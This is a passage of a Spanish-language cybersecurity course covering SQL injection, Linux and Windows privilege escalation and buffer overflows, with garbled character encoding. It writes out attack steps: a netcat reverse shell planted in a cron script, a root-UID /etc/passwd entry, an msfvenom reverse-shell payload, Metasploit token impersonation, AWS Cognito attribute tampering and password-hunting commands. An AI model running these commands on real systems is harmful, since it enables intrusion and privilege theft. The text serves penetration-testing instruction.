- [WSTG - v4.2 | OWASP Foundation](https://owasp.org/www-project-web-security-testing-guide/v42/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05-Testing_for_SQL_Injection)
- [OWASP Top Ten 2017 | A1:2017-Injection | OWASP Foundation](https://owasp.org/www-project-top-ten/2017/A1_2017-Injection.html)

## Conclusi√≥n

En resumen, las pruebas de inyecci√≥n SQL son una herramienta esencial para los evaluadores de penetraci√≥n de aplicaciones web. En esta exploraci√≥n exhaustiva, nos hemos sumergido en los principios y metodolog√≠as fundamentales que nos permiten descubrir vulnerabilidades. Hemos explorado las pruebas manuales en detalle, donde un an√°lisis profundo de las URL, los formularios y las interacciones de los usuarios revela posibles puntos d√©biles.

Cuando se trata de prevenir inyecciones SQL, los campos de formulario y los mecanismos de validaci√≥n son muy importantes. Sin embargo, a veces estas medidas pueden obstaculizar el proceso de prueba y es posible que los evaluadores capacitados necesiten utilizar cargas √∫tiles de derivaci√≥n. Las herramientas automatizadas como SQLmap y Burp Suite resultan invaluables para realizar evaluaciones exhaustivas.

Hemos explicado en detalle c√≥mo funcionan las vulnerabilidades de inyecci√≥n SQL y las vulnerabilidades de inyecci√≥n SQL ciega. La clave para evitar estas vulnerabilidades es desinfectar y escapar de todo lo que env√≠e a la base de datos. En WordPress, la forma m√°s sencilla de hacerlo es utilizando el m√©todo prepare() y marcadores de posici√≥n en su SQL. Ahora que comprende c√≥mo los atacantes explotan estas vulnerabilidades, podr√° proteger mejor sus propios sitios web y los de sus clientes.

Escalamiento de Privilegios

### **¬øC√≥mo funcionan?**

Una de las preguntas m√°s importantes es, ¬øqu√© es exactamente el **[Escalamiento de Privilegios](https://en.wikipedia.org/wiki/Privilege_escalation)**? Es una situaci√≥n que ocurre cuando un usuario malicioso explota una vulnerabilidad. Esta puede consistir en un bug o un fallo en el dise√±o de la aplicaci√≥n.

Tambi√©n puede tratarse de cierto error de configuraci√≥n de la aplicaci√≥n o del sistema operativo en el cual est√° operando el usuario. B√°sicamente, lo que sucede es que el usuario malicioso termina obteniendo acceso privilegiado a recursos que, de acuerdo a sus permisos por defecto, no deber√≠a tenerlos. Dichos privilegios de acceso le dar√°n la posibilidad de robar datos confidenciales o de car√°cter sensible, ejecutar comandos con permisos de administrador. O peor a√∫n, puede arrojar malware o ransomware, lo cual da√±ar√≠a tu sistema operativo en gran medida.

Especialmente, en una organizaci√≥n, esto puede afectar en gran medida la reputaci√≥n de la misma. Esto es as√≠ ya que tanto las personas que trabajan de ella como las que no, pueden tener una percepci√≥n negativa sobre las medidas de seguridad inform√°tica que se aplican en ella. De acuerdo a lo que comentamos anteriormente, la escalaci√≥n de privilegios acostumbra a ser la puerta de entrada a ataques mucho m√°s espec√≠ficos y, por ende, m√°s severos. Uno de los aspectos m√°s preocupantes es que estas escaladas maliciosas pueden confundirse con facilidad con las actividades diarias que se registran en la organizaci√≥n.

![NoSQL2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL2.png?raw=true)

### **¬øC√≥mo funciona la Escalamiento de Privilegios?**

Los cibercriminales, empiezan con la explotaci√≥n de alguna vulnerabilidad que permita ejecutar dicha escalada, ya sea en un sistema o aplicaci√≥n. Pueden acceder tanto a datos como funcionalidades de otro usuario con mayor cantidad de privilegios (esto es el **Escalamiento Horizontal de Privilegios**) o bien, obtener privilegios elevados. Tales privilegios elevados generalmente provienen de usuarios administradores o los conocidos como *"power user"*. A esto √∫ltimo se lo conoce como **Escalamiento Vertical de Privilegios**.

Para comprender mejor ambos tipos de escaladas, tanto la horizontal como la vertical, haremos algunas distinciones:

**Escalamiento Horizontal:** Es la capacidad de realizar una o m√°s acciones similares a los permisos y accesos que tiene una cuenta con bajos privilegios. En la imagen de ejemplo (Figura 1) en el contexto en donde se est√° evaluando un sistema de citas m√©dicas el usuario atacante puede tambi√©n leer las citas m√©dicas gestionadas por otros usuarios del sistema evaluado. el usuario malicioso mantiene sus privilegios de bajo nivel actuales.

Sin embargo, consigue tener acceso a datos y funcionalidades que no deber√≠an estar disponibles para este. Los mismos pueden pertenecer a otros usuarios con mayores privilegios o procesos de sistema. Un ejemplo que se puede citar es el acceso a perfiles de usuarios ajenos al tuyo, aunque est√©s dentro de tu propia sesi√≥n. Esto puede aplicarse a redes sociales o plataformas de compras, bancos, etc.

Implica obtener acceso a otra cuenta, humana o m√°quina, con privilegios similares. Generalmente conocido como apropiaci√≥n de cuenta, esto explora la falta de protecci√≥n adecuada en dicha cuenta. Es importante para un atacante porque aumenta la superficie de ataque y tal vez esta cuenta tenga acceso a algo que tenga una vulnerabilidad que permita una escalada vertical de privilegios.

**Escalamiento Vertical:** Es la capacidad de realizar una o m√°s acciones diferentes a los permisos y accesos que tiene una cuenta con altos privilegios. En la imagen de ejemplo (Figura 1) en el contexto en donde se est√° evaluando un sistema de citas m√©dicas el usuario atacante puede inicialmente leer las citas m√©dicas, pero adicionalmente ahora tiene la capacidad de editar, eliminar y crear usuarios del sistema de citas m√©dicas.

En este caso, el usuario malicioso que tiene una cuenta de usuario con privilegios bajos, pasa a tener mayor cantidad de privilegios como si fuese un usuario administrador de Windows, por ejemplo. Aunque el Escalamiento de Privilegios puede ocurrir en cualquiera de los otros sistemas operativos que conocemos. A partir de este momento, el usuario malicioso puede tener completo control sobre las credenciales de otros usuarios, datos importantes, procesos, aplicaciones y m√°s.

Podr√° descargar malware, borrar datos o bien, ejecutar c√≥digo malicioso para llevar a cabo ataques a√∫n m√°s severos. La peor parte es que el cibercriminal puede borrar cualquier rastro del ataque que haya llevado a cabo mediante esta escalada de privilegios, de manera a que no sea posible localizar alg√∫n tipo de evidencia que permita el an√°lisis de estos eventos.

Implica obtener acceso a una cuenta que tiene mayores privilegios, por ejemplo, de un usuario normal que obtiene derechos de root. Esto puede resultar complejo porque es posible que se necesitan varios pasos y condiciones para omitir o anular los controles.

![NoSQL3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL3.png?raw=true)

### **¬øC√≥mo ejecutamos la t√©cnica para escalar privilegios?**

Amazon Cognito es un proveedor de autenticaci√≥n completamente administrado que permite el registro, la verificaci√≥n, el inicio de sesi√≥n del usuario y m√°s. Posterior al ingresar nuestras credenciales en un entorno en donde se encuentra funcionando AWS cognito se mostrar√° una solicitud y respuesta similar a la siguiente forma:

![NoSQL4](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL4.png?raw=true)

En el cuerpo de la solicitud se puede visualizar un par√°metro de nombre ‚Äú***AccesToken***‚Äù en algunos casos este nombre puede variar, este par√°metro contiene un token JWT el cual al ser enviado al servidor este responde con informaci√≥n relacionada a la cuenta como el par√°metro custom:profile y custom:registerType.

![NoSQL5](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL5.png?raw=true)

La informaci√≥n mostrada anteriormente puede ser consumida directamente desde la interfaz de l√≠nea de comandos (*cli*) de AWS, como condici√≥n es importante contar con el valor del par√°metro ‚Äú***AccesToken***‚Äù el cual ser√° utilizado por la opci√≥n ‚Äú**‚Äîacces-token**‚Äù en el *cli* de AWS. A continuaci√≥n, se describe la l√≠nea de comando utilizada:

> aws ‚Äìno-verify-ssl cognito-idp get-user ‚Äìregion us-east-1 ‚Äìacces-token ‚Äúvalor del par√°metro AccesToken‚Äù

Finalmente, para concretar la t√©cnica intentaremos editar el valor de los atributos **custom:profile** y **custom:registerType** de cliente a administrador, ejecutando las siguientes l√≠neas de comando:

> aws ‚Äìno-verify-ssl cognito-idp update-user-attributes ‚Äìregion us-east-1 ‚Äìacces-token ‚Äúvalor del par√°metro AccesToken‚Äù ‚Äìuser-atributes Name=custom:profile, Value=administrador1. ¬† aws ‚Äìno-verify-ssl cognito-idp update-user-attributes ‚Äìregion us-east-1 ‚Äìacces-token ‚Äúvalor del par√°metro AccesToken‚Äù ‚Äìuser-atributes Name=custom:registerType, Value=administrador

> aws ‚Äìno-verify-ssl cognito-idp update-user-attributes ‚Äìregion us-east-1 ‚Äìacces-token ‚Äúvalor del par√°metro AccesToken‚Äù ‚Äìuser-atributes Name=custom:registerType, Value=administrador

Ejecutando los pasos descritos se puede verificar que efectivamente utilizando est√° t√©cnica es posible escalar privilegios de manera vertical, es decir, en nuestra imagen de ejemplo (Figura 1) en el contexto en donde se est√° evaluando un sistema de citas m√©dicas el usuario que inicialmente pod√≠a leer citas m√©dicas ahora tambi√©n tiene la capacidad de editar, eliminar y crear usuarios del sistema.

![NoSQL6](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL6.png?raw=true)

### **Tips:**

1. El valor del usuario de altos privilegios puede variar, es decir, podr√≠a ser: admin, administrator, administrador o tener otro nombre, para ello se recomienda revisar los archivos js en donde quiz√°s se pueda encontrar mayor informaci√≥n.
2. En algunos casos el par√°metro ‚Äú‚Äîregion‚Äù var√≠a, para ello se tendr√≠a que probar con otros valores:

[https://docs.aws.amazon.com/es_es/AWSEC2/latest/UserGuide/using-regions-availability-zones.html](https://docs.aws.amazon.com/es_es/AWSEC2/latest/UserGuide/using-regions-availability-zones.html)

### **Recomendaci√≥n:**

1. Realizar una validaci√≥n de permisos y privilegios en donde AWS Cognito no permita la edici√≥n de atributos a usuarios con bajos privilegios.
2. La remediaci√≥n de lo descrito esta ligado estrictamente a una inadecuada configuraci√≥n en AWS cognito en donde los permisos de escritura y lectura no fueron segmentados y establecidos de manera correcta.
3. Se recomienda leer la documentaci√≥n emitida por el fabricante para restringir y limitar la edici√≥n de atributos:

[https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-attributes.html](https://docs.aws.amazon.com/cognito/latest/developerguide/user-pool-settings-attributes.html)

![NoSQL7](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL7.png?raw=true)

Los servidores son mayormente Linux, pero tambi√©n hay server con Windows veamos alguna t√©cnicas de escala de privilegios.

### **Escalada de privilegios en Linux**

Sudo es un software que permite al administrador del sistema brindar a ciertos usuarios (o grupos de usuarios) la capacidad de ejecutar algunos (o todos) los comandos como root mientras registra todos los comandos y argumentos. Entonces, cuando un usuario quiere ejecutar alg√∫n comando con permisos de root, generalmente lo hace.¬† Lo primero que debe hacer un usuario al acceder a una m√°quina es precisamente ver qu√© versi√≥n de Sudo existe (si existe) con el comando sudo --version.

![NoSQL8](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL8.png?raw=true)

Esta es actualmente la √∫ltima versi√≥n de sudo por lo que no deber√≠a tener ninguna vulnerabilidad, o mejor dicho, no deber√≠a tener ninguna vulnerabilidad *conocida*. Un vector de ataque t√≠pico en la escalada de privilegios son los programas obsoletos y, en este caso, existe un exploit conocido para la versi√≥n sudo ‚â§1.8.14 que permite a cualquier usuario obtener acceso root (CVE-2015‚Äì6502).

![NoSQL9](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL9.png?raw=true)

A√∫n en Sudo, siempre se debe ejecutar el comando sudo -l donde se pueda ver qu√© comandos puede usar un usuario con privilegios en el host. A√∫n as√≠, para ejecutar dicho comando como root el atacante debe conocer la contrase√±a del usuario.

![NoSQL10](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL10.png?raw=true)

En este ejemplo, al ejecutar sudo -l sabemos que el usuario puede ejecutar el comando sudoedit en el archivo /home/*/*/test.sh como root.

### **Archivos confidenciales grabables**

Esto sucede cuando el usuario puede escribir en /etc/passwd o /etc/shadow. Estos archivos son donde en el sistema se guardan todos los usuarios que tienen acceso al sistema y los hash de contrase√±a de los usuarios, respectivamente.

![NoSQL11](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL11.png?raw=true)

La imagen de arriba muestra los permisos correctos que debe tener el archivo; solo el usuario root debe poder escribirlo. Si cualquier usuario pudiera escribir en √©l, un atacante podr√≠a crear una entrada que diga que cierto usuario tiene privilegios de root.

Para profundizar un poco m√°s en c√≥mo sucede esto, primero debemos saber un poco c√≥mo se completa ese archivo. Esta es una l√≠nea normal en el archivo:

test:x:0:0:root:/root:/bin/bash

- prueba: es el nombre de usuario
- x: es la contrase√±a. Cuando es una 'x' significa que la contrase√±a est√° cifrada en/etc/shadow
- 0: es el ID de usuario. '0' est√° reservado para root.
- 0: es el ID del grupo
- ra√≠z: es la informaci√≥n de identificaci√≥n del usuario
- /root: es el directorio de inicio del usuario
- /bin/bash: es la ruta absoluta del shell que utiliza este usuario.

Ahora veamos la prueba de concepto de la vulnerabilidad. Para recordar, lo que queremos hacer es, si podemos escribir en /etc/passwd, crear un hash de contrase√±a, hacer una entrada en el archivo con el hash que creamos en la contrase√±a, iniciar sesi√≥n como ese usuario con acceso root.

> Crear hash de contrase√±a:

![NoSQL12](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL12.png?raw=true)

> Crea una entrada y col√≥cala en el archivo:

![NoSQL13](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL13.png?raw=true)

> Simplemente inicie sesi√≥n en el usuario ch con privilegios de root. La contrase√±a es pass123.

## **Procesos que se ejecutan autom√°ticamente**

Los cronjobs son procesos que el sistema ejecuta autom√°ticamente con una cierta periodicidad. A veces, estos ejecutan un determinado archivo bash como root y tambi√©n ejecutan un determinado conjunto de comandos como root. Si identificamos un cronjob que ejecuta un archivo que tambi√©n podemos escribir‚Ä¶ Ver√°s hacia d√≥nde va esto.

Para ver qu√© cronjobs se est√°n ejecutando, simplemente ejecute el comando cat /etc/crontab. Si esto no devuelve nada √∫til podemos ejecutar un programa llamado pspy64 ( ¬†[https://github.com/DominicBreuker/pspy](https://github.com/DominicBreuker/pspy) ) que nos muestra todos los procesos en ejecuci√≥n en el sistema.

En este ejemplo, encontramos que cierto archivo (cleanall.sh) se ejecuta como root y podemos escribir en √©l. As√≠ que intentamos que ejecute un shell inverso de netcat en nuestra m√°quina y, si la conexi√≥n es exitosa, obtenemos acceso root a la m√°quina.

> En nuestra m√°quina iniciamos un oyente netcat:
> 
> 
> nc -lnvp <port>
> 
> En nuestro objetivo colocamos en el archivo anterior una conexi√≥n con nuestro oyente:
> 
> echo "nc -e /bin/bash <our_ip> <port> > cleanall.sh.
> 
> Cuando esto se ejecuta, tenemos nuestro shell ra√≠z.

### **Abusar de SUID/GUID**

Esto es un poco m√°s complicado, por lo que hay algunos conceptos te√≥ricos de los que se debe hablar. Todo en Linux es un archivo con permisos.

![NoSQL14](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL14.png?raw=true)

Este archivo tiene todos los permisos y podemos configurarlo con el comando chmod 777. Te preguntar√°s por qu√© 777, bueno, se trata de bits. Si piensa en estos permisos como bits 7, es la combinaci√≥n de 4 (lectura), 2 (escritura) y 1 (ejecuci√≥n). Entonces chmod 600 corresponde a rw -‚Äî ‚Äî y chmod 764 corresponde a rwx-rw-r. Un SUID es un tipo de permiso de usuario que permite a los usuarios ejecutar un archivo con los permisos de un usuario espec√≠fico. Aquellos archivos que tienen permisos SUID se ejecutan con privilegios m√°s altos.

Bueno, ahora,¬† ¬øc√≥mo los encontramos? Bueno, usando el siguiente comando. find / -perm -u=s -type f 2>/dev/null

Ahora cada comando que tiene un SUID tiene un m√©todo de exploraci√≥n diferente, por lo que no puedo ponerlos todos aqu√≠. Pero hay muchos exploits en el incre√≠ble sitio web [https://gtfobins.github.io/](https://gtfobins.github.io/) .

### **LinPEAS**

LinPEAS es un script que busca autom√°ticamente posibles rutas para escalar privilegios. El objetivo es descargar el script en la m√°quina de destino, otorgarle los permisos y ejecutarlo. Podemos obtener el script en [https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) .

## **Escalada de privilegios de Windows**

### **Enumeraci√≥n inicial**

- **Enumeraci√≥n del sistema**

> systeminfo
> 
> 
> systeminfo | findstr /B /C: "os name" /C: "os version" /C: "system type"

![NoSQL15](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL15.png?raw=true)

> Hostname


![NoSQL16](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL16.png?raw=true)

> wmic qfe
> 
> 
> wmic = l√≠nea de comando de instrumentaci√≥n de administraci√≥n de Windows
> 
> qfe = ingeniero de soluci√≥n r√°pida
> 
> wmic logicaldisk
> 
> wmic logicaldisk get caption,description,providername 

![NoSQL17](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL17.png?raw=true)

- **Enumeraci√≥n de usuarios**

> whoami /priv Para saber qu√© privilegios tenemos
> 
> 
> whoami /groups Para saber en qu√© grupos se encuentra el usuario
> 
> net user Esto nos mostrar√° los usuarios en esa m√°quina.
> 
> net user user1 Para m√°s informaci√≥n de ese usuario1
> 
> net local group user1
> 
> ipconfig
> 
> ipconfig /all
> 
> arp -a
> 
> tablas arpa
> 
> route print
> 
> netstat -ano
> 
> ¬øA qui√©n nos comunicamos, etc.?
> 
- B√∫squeda de contrase√±as

> Algunos archivos SAML almacenan hash de contrase√±as en el sistema
> 
> 
> unattend.xml tambi√©n puede almacenar contrase√±as.
> 
> findstr /si password *.txt *.ini *.config
> 
> La contrase√±a es una cadena aqu√≠, puede ser reemplazada por cualquier cosa.
> 
> findstr /spin "password" *.
> 
> encuentra todas las contrase√±as en todos los archivos
> 
- Cortafuegos y antivirus

> sc query windefend
> 
> 
> sc = control de servicio
> 
> windefend comprueba si el defensor est√° presente o no.
> 

![NoSQL18](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL18.png?raw=true)

Est√° funcionando

> sc queryex type= service
> 
> 
> muestra todos los servicios que se ejecutan en el sistema
> 

![NoSQL19](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL19.png?raw=true)

> netsh advfirewall firewall dump
> 
> 
> netsh firewall show state
> 

![NoSQL20](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL20.png?raw=true)

> netsh firewall show config
> 
> 
> muestra la configuraci√≥n del firewall.
> 

![NoSQL21](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL21.png?raw=true)

![NoSQL22](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL22.png?raw=true)

## **Explotaciones del kernel**

Un Kernel es el componente central del sistema operativo y act√∫a como un puente entre los componentes de hardware y las aplicaciones de software.

Cuando un sistema operativo se carga en la memoria, el kernel se carga primero y permanece en la memoria hasta que el sistema operativo se apaga nuevamente.

El kernel es responsable de tareas de bajo nivel, como la administraci√≥n de discos, la administraci√≥n de tareas y la administraci√≥n de memoria.

Inicialmente, estos exploits se facilitan una vez que logramos establecernos en nuestro sistema de destino, por lo que despu√©s de obtener acceso a trav√©s de metasploit (preferiblemente), ejecute esto /post/multi/recon/local_exploit_suggestery verifique si Kitrap0d existe.

### **Explotaci√≥n Kitrap0d**

Inicialmente crearemos un shell inverso y lo cargaremos en el sistema de destino `msfvenom -p windows/shell_reverse_tcp LHOST=yourIP LPORT=555 -f aspx > myfile.aspx`

> -p = carga √∫til (aqu√≠ un shell inverso simple)
> 
> 
> LHOST = direcci√≥n IP actual del sistema
> 
> LPORT = puerto de su elecci√≥n
> 
> -f = tipo de archivo (a qu√© tipo de archivo va el sistema para trabajar)
> 
> > = guardar el archivo de salida con un nombre de archivo

de alguna manera cargue este archivo en el sistema de destino. Aqu√≠ usamos ftp como ejemplo para cargarftp 10.0.0.1

password is anonymous and then type "put manual.aspx nc -nvlp 555

Vaya a la direcci√≥n IP/sitio e invoque la carga √∫til.

### Potato Attacks

Supongamos que tenemos un shell en la m√°quina con Windows y despu√©s de verificar whoami /priv descubrimos que tenemos privilegios de token de suplantaci√≥n.

![NoSQL23](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL23.png?raw=true)

Lo que nos ayuda a obtener NT/Autoridad mediante un ataque de papa, entonces se puede hacer lo siguiente:

habr√° dos instancias en este punto

> La primera instancia es que debemos tener un pie en el sistema y verificar si el sistema tiene alg√∫n privilegio de identidad (figura anterior).
> 
> 
> Es el shell de Metasploit que estamos a punto de trazar.

### En Metasploit:

> usar/exploit/multi/script/web_delivery
> 
> 
> establecer el objetivo como PSH (PowerShell)
> 
> establecer la carga √∫til comowindows/meterpreter/reverse_tcp

configure LHOST y SRVHOST como su direcci√≥n IP.

Ingrese a ejecutar, obtendremos una carga √∫til, la copiaremos y la pegaremos en la primera instancia donde est√© presente el caparaz√≥n de apoyo inicial (1.)

![NoSQL24](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL24.png?raw=true)

Pegue el comando anterior en primera instancia.

Despu√©s de pegar, ingrese session1 y escriba getprivs

compruebe si es arquitectura x64 o x86 escribiendogetuid

Ejecute `post/multi/recon/local_exploit_suggestery` verifique todos los exploits disponibles que se pueden aprovechar.

`correrwindows/local/ms16_075_reflection`

establecer sesi√≥n en 1

establezca LHOST en la ip de kali

configure LPORT en cualquier puerto en el que la sesi√≥n 1 no est√© escuchando

establecer la carga √∫til `enwindows/x64/meterpreter/reverse_tcp`

correr

load incognito

![NoSQL25](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/NoSQL25.png?raw=true)

escriba list_tokens -uy observe **NT AUTHORITY\SYSTEM**

tipoimpersonate_token "NT Authority\SYSTEM"

escriba shellahora somos como Autoridad

En el caso de Labs y boxes, puede haber alguna situaci√≥n de flujo de datos que se utiliza para ocultar la informaci√≥n de un archivo. En esos casos, podemos usar este blog: [https://blog.malwarebytes.com/101/2015/07/introduction-to -flujos-de-datos-alternativos/](https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/)

frases simples podr√≠an ser **dir /R** (para b√∫squeda recursiva de archivos en el directorio) **m√°s <nombre del archivo que se desea buscar**

### **Referencias:**

> SecWiki/exploits-del-kernel-de-windows: exploits-del-kernel-de-windows WindowsÂπ≥Âè∞ÊèêÊùÉÊºèÊ¥ûÈõÜÂêà (github.com)
> 

# Buffer overflow

## **¬øQu√© es el desbordamiento del b√∫fer?**

Los buffers son regiones de almacenamiento de memoria que contienen datos temporalmente mientras se transfieren de una ubicaci√≥n a otra. Un desbordamiento del b√∫fer (o desbordamiento del b√∫fer) ocurre cuando el volumen de datos excede la capacidad de almacenamiento del b√∫fer de memoria. Como resultado, el programa que intenta escribir los datos en el b√∫fer sobrescribe las ubicaciones de memoria adyacentes .

Por ejemplo, se puede dise√±ar un b√∫fer para las credenciales de inicio de sesi√≥n para que espere entradas de nombre de usuario y contrase√±a de 8 bytes, de modo que si una transacci√≥n implica una entrada de 10 bytes (es decir, 2 bytes m√°s de lo esperado), el programa puede escribir el exceso. datos m√°s all√° del l√≠mite del buffer.

Los desbordamientos de b√∫fer pueden afectar a todo tipo de software. Por lo general, son el resultado de entradas con formato incorrecto o de no asignar suficiente espacio para el b√∫fer. Si la transacci√≥n sobrescribe el c√≥digo ejecutable, puede hacer que el programa se comporte de manera impredecible y genere resultados incorrectos, errores de acceso a la memoria o fallas.

![Buffer1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer1.png?raw=true)

Se produce un desbordamiento del b√∫fer cuando un programa intenta escribir demasiados datos en el b√∫fer. Esto puede hacer que el programa falle o ejecute c√≥digo arbitrario. Las vulnerabilidades de desbordamiento de b√∫fer existen s√≥lo en lenguajes de programaci√≥n de bajo nivel como C con acceso directo a la memoria. Sin embargo, tambi√©n afectan a los usuarios de lenguajes web de alto nivel porque los marcos suelen estar escritos en lenguajes de bajo nivel. El siguiente es el c√≥digo fuente de un programa en C que tiene una vulnerabilidad de desbordamiento del b√∫fer:

> char greeting[5];
> 
> 
> memcpy(greeting, "Hello, world!\n", 15);
> 
> printf(greeting);
> 

**¬øQu√© crees que pasar√° cuando compilamos y ejecutamos este programa vulnerable?** La respuesta puede resultar sorprendente: cualquier cosa puede pasar. Cuando se ejecuta este fragmento de c√≥digo, intentar√° colocar quince bytes en un b√∫fer de destino que tiene solo cinco bytes de longitud. Esto significa que se escribir√°n diez bytes en direcciones de memoria fuera de la matriz. Lo que suceda despu√©s depende del contenido original de los diez bytes de memoria sobrescritos.

¬øQuiz√°s se almacenaron variables importantes all√≠ y acabamos de cambiar sus valores? El ejemplo anterior est√° roto de una manera tan obvia que ning√∫n programador en su sano juicio cometer√≠a tal error. Entonces consideremos otro ejemplo. Supongamos que necesitamos leer una direcci√≥n IP de un archivo. Podemos hacerlo usando el siguiente c√≥digo C:

> #include <stdio.h>
> 
> 
> #define MAX_IP_LENGTH 15
> 
> int main(void) {
> 
> char file_name[] = "ip.txt";
> 
> FILE *fp;
> 
> fp = fopen(file_name, "r");
> 
> char ch;
> 
> int counter = 0;
> 
> char buf[MAX_IP_LENGTH];
> 
> while((ch = fgetc(fp)) != EOF) {
> 
> buf[counter++] = ch;
> 
> }
> 
> buf[counter] = '\0';
> 
> printf("%s\n", buf);
> 
> fclose(fp);
> 
> return 0;
> 
> }
> 

El error en el ejemplo anterior no es tan obvio. Suponemos que la direcci√≥n IP que queremos leer de un archivo nunca exceder√° los 15 bytes. Las direcciones IP adecuadas (por ejemplo, 255.255.255.255) no pueden tener m√°s de 15 bytes. Sin embargo, un usuario malintencionado puede preparar un archivo que contenga una cadena falsa muy larga en lugar de una direcci√≥n IP (por ejemplo, 19222222222.16888888.0.1). Esta cadena har√° que nuestro programa desborde el b√∫fer de destino.

## **¬øQu√© es un ataque de desbordamiento de b√∫fer?**

Los atacantes aprovechan los problemas de desbordamiento del b√∫fer sobrescribiendo la memoria de una aplicaci√≥n. Esto cambia la ruta de ejecuci√≥n del programa, desencadenando una respuesta que da√±a archivos o expone informaci√≥n privada. Por ejemplo, un atacante puede introducir c√≥digo adicional y enviar nuevas instrucciones a la aplicaci√≥n para obtener acceso a los sistemas de TI.

Si los atacantes conocen el dise√±o de la memoria de un programa, pueden alimentar intencionalmente entradas que el b√∫fer no puede almacenar y sobrescribir √°reas que contienen c√≥digo ejecutable, reemplaz√°ndolo con su propio c√≥digo. Por ejemplo, un atacante puede sobrescribir un puntero (un objeto que apunta a otra √°rea de la memoria) y apuntarlo a una carga √∫til de explotaci√≥n para obtener control sobre el programa.

- **Ejemplo de ataque de desbordamiento del buffer de pila**

Ahora que sabemos que un programa puede desbordar una matriz y sobrescribir un fragmento de memoria que no deber√≠a sobrescribir, veamos c√≥mo se puede utilizar esto para montar un ataque de desbordamiento de b√∫fer. En un escenario t√≠pico (llamado *desbordamiento del b√∫fer de pila* ), el problema se debe (como tantos problemas en la seguridad de la informaci√≥n) a la mezcla de datos (destinados a ser procesados ‚Äã‚Äão mostrados) con comandos que controlan la ejecuci√≥n del programa. En C, como en la mayor√≠a de los lenguajes de programaci√≥n, los programas se crean utilizando funciones.

Las funciones se llaman entre s√≠, se pasan argumentos entre s√≠ y devuelven valores. Por ejemplo, nuestro c√≥digo, que lee una direcci√≥n IP de un archivo, podr√≠a ser parte de una funci√≥n llamada readIpAddress, que lee una direcci√≥n IP de un archivo y la analiza. Esta funci√≥n podr√≠a ser llamada por alguna otra funci√≥n, por ejemplo readConfiguration. Cuando readConfigurationllama readIpAddress, le pasa un nombre de archivo y luego la readIpAddressfunci√≥n devuelve una direcci√≥n IP como una matriz de cuatro bytes. Fig. 1. Los argumentos y el valor de retorno de la funci√≥n readIpAddress.

![Buffer2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer2.png?raw=true)

Durante esta llamada a funci√≥n, se almacenan tres piezas diferentes de informaci√≥n, una al lado de la otra, en la memoria de la computadora. Para cada programa, el sistema operativo mantiene una regi√≥n de memoria que incluye una parte llamada *pila* o *pila de llamadas* (de ah√≠ el nombre *de desbordamiento del b√∫fer de pila* ). Cuando se llama a una funci√≥n, se le asigna un fragmento de la pila. Esta pieza de la pila (llamada *marco* ) se utiliza para:

- Recuerde la l√≠nea de c√≥digo desde la cual se debe reanudar la ejecuci√≥n del programa cuando se complete la ejecuci√≥n de la funci√≥n (en nuestro caso, ser√° una l√≠nea espec√≠fica de la readConfigurationfunci√≥n)
- Almacene los argumentos pasados ‚Äã‚Äãa la funci√≥n por su llamador (en nuestro caso, supongamos /home/someuser/myconfiguration/ip.txt)
- Almacene el valor de retorno que la funci√≥n devuelve a su llamador (en nuestro caso, es una matriz de cuatro bytes, digamos (192, 168, 0, 1))
- Almacenar variables locales de la funci√≥n llamada mientras se ejecuta esta funci√≥n (en nuestro caso, la variable char[MAX_IP_LENGTH] buf)

<aside>
üëâ Entonces, si un programa tiene un b√∫fer asignado en el marco de la pila e intenta insertar m√°s datos de los que caben all√≠, los datos ingresados ‚Äã‚Äãpor el usuario pueden desbordarse y sobrescribir la ubicaci√≥n de la memoria donde se almacena la direcci√≥n del remitente. Contenido del marco de la pila cuando se llama a la funci√≥n readIPAddress:

</aside>

![Buffer3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/buffer3.png?raw=true)

Si el problema fue causado por datos de entrada aleatorios mal formados del usuario, lo m√°s probable es que la nueva direcci√≥n de retorno no apunte a una ubicaci√≥n de memoria donde est√© almacenado ning√∫n otro programa, por lo que el programa original simplemente fallar√°. Sin embargo, si los datos se preparan cuidadosamente, pueden provocar la ejecuci√≥n de c√≥digo no deseada.

El primer paso para el atacante es preparar datos especiales que puedan interpretarse como c√≥digo ejecutable y que funcionen en beneficio del atacante (esto se denomina c√≥digo¬† *shell* ). El segundo paso es colocar la direcci√≥n de estos datos maliciosos en la ubicaci√≥n exacta donde deber√≠a estar la direcci√≥n del remitente. El contenido de ip.txt sobrescribe la direcci√≥n del remitente:

